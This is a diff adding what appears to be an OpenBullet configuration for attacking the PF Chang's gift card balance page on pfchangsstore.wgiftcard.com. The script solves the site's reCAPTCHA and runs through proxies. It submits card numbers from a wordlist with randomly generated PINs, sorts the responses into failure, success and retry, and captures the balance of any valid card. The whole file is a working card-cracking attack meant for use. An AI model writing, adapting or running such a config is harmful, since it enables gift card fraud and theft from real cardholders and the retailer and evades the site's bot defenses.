@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "PF Changs GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-14T16:41:53.5696773+00:00",
+  "AdditionalInfo": "",
+  "Author": "Tunacan",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 387786529
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+RECAPTCHA "https://pfchangsstore.wgiftcard.com/rbc/pfchangs" "6LcmqwITAAAAAD_8PDdcM-9AhyftRNtFXn1U5e_8" -> VAR "RECAP" 
+FUNCTION RandomNum 100000 999999 "<PIN>" -> VAR "PIN" 
+FUNCTION RandomNum 100000 999999 "<PIN2>" -> VAR "PIN2" 
+REQUEST POST "https://pfchangsstore.wgiftcard.com/rbc/pfchangs" AutoRedirect=TRUE 
+  CONTENT "gc_number=<USER>&gc_pin=<PIN><PIN2>&email=&g-recaptcha-response=<RECAP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://pfchangsstore.wgiftcard.com" 
+  HEADER "referer: https://pfchangsstore.wgiftcard.com/rbc/pfchangs" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Please check your gift card number" 
+    KEY "The Gift Card PIN field is required" 
+    KEY "Invalid account number or the account is closed." 
+    KEY "Sorry, we are not able to verify this gift card number." 
+  KEYCHAIN Success OR 
+    KEY "The balance on your gift card ending with " 
+  KEYCHAIN Retry OR 
+    KEY "Sorry, your information does not match" 
+    KEY "Service Unavailable" 
+    KEY "The requested service cannot be accessed from your location" 
+    KEY "The reCaptcha field is required" 
+PARSE "<SOURCE>" LR "The balance on your gift card ending with" ".</div>" Recursive=FALSE -> CAP "Balance" "" "" 
